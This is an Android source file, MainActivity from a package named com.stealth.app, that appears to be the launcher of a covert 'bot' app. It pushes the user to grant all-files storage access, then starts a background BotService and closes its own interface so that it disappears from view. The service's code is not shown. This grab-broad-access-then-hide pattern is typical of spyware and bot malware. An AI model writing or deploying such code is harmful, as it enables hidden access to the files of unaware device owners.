package com.stealth.app;
import android.app.Activity; import android.content.Intent; import android.net.Uri;
import android.os.Build; import android.os.Bundle; import android.os.Environment;
public class MainActivity extends Activity {
    private boolean started = false;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);
        checkAndStart();
    }

    @Override protected void onResume() {
        super.onResume();
        checkAndStart();
    }

    private void checkAndStart() {
        if (started) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent i = new Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } else {
                started = true;
                startBot();
            }
        } else {
            started = true;
            startBot();
        }
    }

    private void startBot() {
        startService(new Intent(this, BotService.class));
        finishAffinity();
    }
}